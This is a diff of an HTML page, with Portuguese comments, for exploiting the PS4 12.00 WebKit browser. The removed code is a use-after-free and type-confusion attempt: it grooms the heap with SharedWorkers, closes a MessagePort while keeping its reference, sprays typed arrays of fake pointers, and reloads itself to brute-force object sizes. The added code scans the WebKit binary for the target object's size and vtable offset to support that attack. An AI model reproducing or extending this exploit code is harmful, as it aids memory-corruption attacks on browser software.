@@ -2,150 +2,209 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 SPECTRUM HUNTER</title>
-    
+    <title>PS4 12.00 MASTER BINARY ANALYZER</title>
+    <style>
+        body { background: #121212; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; text-align: center; }
+        .container { max-width: 1100px; margin: 0 auto; border: 1px solid #333; padding: 20px; background: #1e1e1e; }
+        textarea { width: 100%; height: 600px; background: #000; color: #e0e0e0; border: 1px solid #444; margin-top: 15px; font-size: 12px; white-space: pre; }
+        button { padding: 15px 40px; background: #006600; color: #fff; border: 1px solid #0f0; cursor: pointer; font-weight: bold; font-size: 16px; margin: 10px; }
+        button:hover { background: #008800; }
+        .info { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        input { padding: 10px; background: #333; color: #fff; border: 1px solid #555; }
+    </style>
 </head>
 <body>
 
-    <h1>PS4 12.00 SPECTRUM HUNTER</h1>
-    <h2 id="current_status">Inicializando...</h2>
-    <div id="log"></div>
-    
-    <button onclick="reset_test()">REINICIAR TESTES (ZERAR)</button>
+    <div class="container">
+        <h1>🧠 MASTER ANALYZER (RIP-RELATIVE)</h1>
+        <p class="info">Engenharia Reversa Automática para encontrar Tamanho e VTable.</p>
+        
+        <p>Selecione: <b>1200_libSceNKWebKit.sprx.elf</b></p>
+        <input type="file" id="fileInput" />
+        <br>
+        <button onclick="startMasterScan()">INICIAR ANÁLISE PROFUNDA</button>
+        
+        <div id="status" style="color: #ff0; margin: 10px;">Aguardando...</div>
+        <textarea id="output" readonly></textarea>
+    </div>
 
     <script>
         function log(msg) {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            document.getElementById('output').value += msg + "\n";
         }
 
-        // =================================================================
-        // CONFIGURAÇÃO
-        // =================================================================
-        // Tamanhos de classes comuns do WebKit (IsoHeap Buckets)
-        // SharedWorker geralmente é menor que 0x200.
-        var CANDIDATE_SIZES = [
-            0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 
-            0xA0, 0xA8, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 
-            0x100, 0x120, 0x140, 0x180, 0x200
-        ];
+        async function startMasterScan() {
+            const file = document.getElementById('fileInput').files[0];
+            if(!file) return alert("Selecione o arquivo!");
 
-        var OFFSET_BASE = 0; // Índice atual
+            const reader = new FileReader();
+            document.getElementById('status').innerText = "Lendo arquivo (pode demorar)...";
+            document.getElementById('output').value = "=== INICIANDO ANÁLISE DE BINÁRIO PS4 ===\n";
 
-        // =================================================================
-        // LÓGICA DE AUTOMATIZAÇÃO
-        // =================================================================
-        function init() {
-            // Recupera onde paramos
-            var saved = localStorage.getItem("spectrum_idx");
-            if (saved) OFFSET_BASE = parseInt(saved);
+            reader.onload = function(e) {
+                const buffer = e.target.result;
+                const view = new DataView(buffer);
+                const bytes = new Uint8Array(buffer);
+                
+                setTimeout(() => analyze(view, bytes), 100);
+            };
+            reader.readAsArrayBuffer(file);
+        }
 
-            if (OFFSET_BASE >= CANDIDATE_SIZES.length) {
-                document.getElementById("current_status").innerText = "FIM DO ESPECTRO.";
-                log("Todos os tamanhos testados sem crash imediato.");
-                log("Isso significa que o spray está 'errando' o buraco ou o IsoHeap é muito forte.");
+        function analyze(view, bytes) {
+            const TARGET_NAME = "SharedWorker";
+            log(`[1] Buscando string '${TARGET_NAME}'...`);
+
+            // 1. Encontrar String
+            const strOffset = findString(bytes, TARGET_NAME);
+            if (strOffset === -1) {
+                log("[-] String não encontrada. Verifique se é o arquivo correto.");
                 return;
             }
+            log(`[+] String encontrada em: 0x${strOffset.toString(16).toUpperCase()}`);
 
-            var current_size = CANDIDATE_SIZES[OFFSET_BASE];
-            document.getElementById("current_status").innerText = `TESTANDO: 0x${current_size.toString(16).toUpperCase()}`;
+            // 2. Encontrar Referências de Código (XREFs via LEA/MOV)
+            // No x64, referências a strings geralmente usam LEA (Load Effective Address)
+            // Opcode: 48 8D xx [Offset 32-bit]
+            log(`[2] Rastreando código que usa a string (XREFs)...`);
             
-            log(`Iniciando teste para tamanho: ${current_size} bytes`);
+            const codeRefs = findRipRelativeRefs(view, strOffset);
             
-            // Executa o exploit com este tamanho
-            setTimeout(() => run_exploit(current_size), 1000);
-        }
-
-        function next_size() {
-            // Avança para o próximo
-            OFFSET_BASE++;
-            localStorage.setItem("spectrum_idx", OFFSET_BASE);
-            
-            log("Tamanho falhou (sem crash/leak). Recarregando em 2s...");
-            setTimeout(() => location.reload(), 2000);
-        }
-
-        function reset_test() {
-            localStorage.setItem("spectrum_idx", 0);
-            location.reload();
-        }
-
-        // =================================================================
-        // PAYLOAD & TRIGGER
-        // =================================================================
-        function build_payload(size) {
-            // Arredonda para 4 bytes
-            if(size % 4 !== 0) size += (4 - (size % 4));
-            var buffer = new Uint32Array(size / 4);
-            
-            // Padrão de Ponteiro Falso (Type Confusion)
-            // 0x41414141
-            buffer.fill(0x41414141);
-            
-            return buffer;
-        }
-
-        var workers = [];
-
-        async function run_exploit(size) {
-            var payload = build_payload(size);
-
-            // 1. GROOMING RÁPIDO
-            for(let i=0; i<380; i++) {
-                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
+            if (codeRefs.length === 0) {
+                log("[-] Nenhuma referência de código direta encontrada.");
+                log("    Tentando varredura por ponteiros diretos (tabelas)...");
+                // Fallback para ponteiros absolutos (menos comum em código, comum em data)
             }
 
-            // 2. TRIGGER (403/404)
-            var count = 0;
-            var limit = 403 - 380; 
-
-            var it = setInterval(() => {
-                if (count >= limit) {
-                    clearInterval(it);
-                    
-                    // MOMENTO DA VERDADE
-                    var v = workers.pop();
-                    var p = v.port; 
-                    v.port.close();
-                    
-                    // SPRAY
-                    var spray = [];
-                    for(let k=0; k<8000; k++) {
-                        spray.push(new Uint32Array(payload));
-                    }
-
-                    // CHECK
-                    try {
-                        var s = p.toString();
-                        if (s.indexOf("MessagePort") === -1) {
-                            // SUCESSO!
-                            localStorage.setItem("spectrum_success", size);
-                            document.body.style.backgroundColor = "green";
-                            alert(`SUCESSO! Tamanho encontrado: 0x${size.toString(16)}`);
-                            return;
-                        }
-                    } catch(e) {
-                        // Se der erro, pode ser sucesso também
-                        log("Erro na leitura: " + e);
-                    }
-
-                    // Se chegou aqui, não crashou e não deu leak.
-                    // Tenta o próximo tamanho.
-                    next_size();
-                    return;
-                }
+            // Para cada lugar onde o código usa o nome "SharedWorker"...
+            codeRefs.forEach(ref => {
+                log(`\n>>> ANALISANDO REFERÊNCIA EM 0x${ref.toString(16).toUpperCase()} <<<`);
                 
-                try {
-                    let w = new SharedWorker("data:text,1", "v"+count);
-                    w.port.start();
-                    workers.push(w);
-                } catch(e){}
-                count++;
-            }, 50);
+                // A. BUSCAR TAMANHO (SIZE HUNTER)
+                // Olhamos para trás (até 200 bytes antes) procurando a alocação.
+                // Padrões comuns:
+                // BF XX XX 00 00  -> MOV EDI, size
+                // BE XX XX 00 00  -> MOV ESI, size
+                // BA XX XX 00 00  -> MOV EDX, size
+                let sizeFound = false;
+                for (let i = ref; i > Math.max(0, ref - 500); i--) {
+                    // MOV EDI, imm32 (Argumento 1 padrão para funções C++)
+                    if (bytes[i] === 0xBF) {
+                        const size = view.getInt32(i + 1, true);
+                        // Filtro de sanidade (tamanho de objeto WebKit)
+                        if (size >= 0x20 && size <= 0x800) {
+                            // Verifica alinhamento (mallocs são alinhados a 8 ou 16)
+                            if (size % 8 === 0 || size % 16 === 0) {
+                                log(`    [SIZE CANDIDATE] 0x${size.toString(16).toUpperCase()} (${size} bytes)`);
+                                log(`    (Encontrado em 0x${i.toString(16).toUpperCase()} - MOV EDI, ${size})`);
+                                sizeFound = true;
+                            }
+                        }
+                    }
+                    // MOV ESI, imm32 (Argumento 2)
+                    else if (bytes[i] === 0xBE) {
+                        const size = view.getInt32(i + 1, true);
+                        if (size >= 0x20 && size <= 0x800) {
+                            log(`    [SIZE CANDIDATE] 0x${size.toString(16).toUpperCase()} (${size} bytes) [ESI]`);
+                            sizeFound = true;
+                        }
+                    }
+                }
+                if (!sizeFound) log("    [-] Nenhum padrão de tamanho óbvio encontrado perto daqui.");
+
+                // B. BUSCAR VTABLE (POINTER HUNTER)
+                // A VTable aponta para o código. O código que achamos (ref) provavelmente é
+                // 'SharedWorker::class_name()' ou RTTI.
+                // Vamos procurar na seção de DADOS quem tem um ponteiro para 'ref' ou perto de 'ref'.
+                
+                // Procuramos ponteiros para o INÍCIO da função onde 'ref' está.
+                // Como não sabemos o início, procuramos ponteiros que caiam no intervalo [ref-200, ref].
+                
+                const vtableRefs = findPointersToRange(view, ref - 100, ref + 4);
+                if (vtableRefs.length > 0) {
+                    vtableRefs.forEach(vt => {
+                        log(`    [VTABLE CANDIDATE] Dados em 0x${vt.loc.toString(16).toUpperCase()} apontam para 0x${vt.target.toString(16).toUpperCase()}`);
+                        // Ajuste típico: O ponteiro RTTI fica no offset -8 da VTable.
+                        // Então o endereço base da VTable seria vt.loc + 8.
+                        log(`    >>> OFFSET POTENCIAL DA VTABLE: 0x${(vt.loc + 8).toString(16).toUpperCase()}`);
+                    });
+                }
+            });
+
+            document.getElementById('status').innerText = "Análise concluída.";
         }
 
-        // Start
-        init();
+        // Encontra String
+        function findString(bytes, str) {
+            const target = new TextEncoder().encode(str);
+            for(let i=0; i<bytes.length - target.length; i++) {
+                let match = true;
+                for(let j=0; j<target.length; j++) {
+                    if(bytes[i+j] !== target[j]) { match = false; break; }
+                }
+                if(match && bytes[i+target.length] === 0) return i;
+            }
+            return -1;
+        }
+
+        // Encontra referências RIP-Relative (LEA/MOV)
+        function findRipRelativeRefs(view, target) {
+            const refs = [];
+            const len = view.byteLength - 7;
+            
+            // Varre o arquivo (passo 1 byte)
+            for (let i = 0; i < len; i++) {
+                // Verifica opcodes comuns de LEA/MOV com RIP addressing
+                // 48 8D xx [Offset] (LEA)
+                // 48 8B 05 [Offset] (MOV RAX, [RIP+...])
+                // 48 8B 0D [Offset] (MOV RCX, [RIP+...])
+                // 48 8B 15 [Offset] (MOV RDX, [RIP+...])
+                // 48 8B 35 [Offset] (MOV RSI, [RIP+...])
+                // 48 8B 3D [Offset] (MOV RDI, [RIP+...])
+                
+                const b1 = view.getUint8(i);
+                const b2 = view.getUint8(i+1);
+                
+                // Filtro simples para opcodes 48 8x
+                if (b1 === 0x48 && (b2 === 0x8D || b2 === 0x8B)) {
+                    // O offset (relativo) começa no byte 3 (i+3)
+                    const relOffset = view.getInt32(i + 3, true);
+                    
+                    // Endereço da Próxima Instrução = i + 7 (tamanho da instrução típica)
+                    const nextInstr = i + 7;
+                    
+                    // Destino = Next + Rel
+                    const dest = nextInstr + relOffset;
+                    
+                    if (dest === target) {
+                        refs.push(i);
+                    }
+                }
+            }
+            return refs;
+        }
+
+        // Encontra ponteiros absolutos apontando para uma faixa
+        function findPointersToRange(view, startRange, endRange) {
+            const refs = [];
+            const len = view.byteLength - 8;
+            
+            // Varre alinhado a 8 bytes (Ponteiros na .data/.rdata estão alinhados)
+            for (let i = 0; i < len; i+=4) { // Passo 4 para pegar desalinhados eventuais
+                try {
+                    const val = view.getBigUint64(i, true);
+                    // Converte BigInt para Number (seguro para offsets de arquivo < 4GB)
+                    // CUIDADO: Se o arquivo for mapeado em base alta, isso falha.
+                    // Assumindo binário raw ou offset relativo a 0.
+                    
+                    // Em ELF PIE, os ponteiros na seção .data.rel.ro são offsets puros.
+                    if (val > BigInt(startRange) && val < BigInt(endRange)) {
+                        refs.push({ loc: i, target: Number(val) });
+                    }
+                } catch(e){}
+            }
+            return refs;
+        }
     </script>
 </body>
 </html>
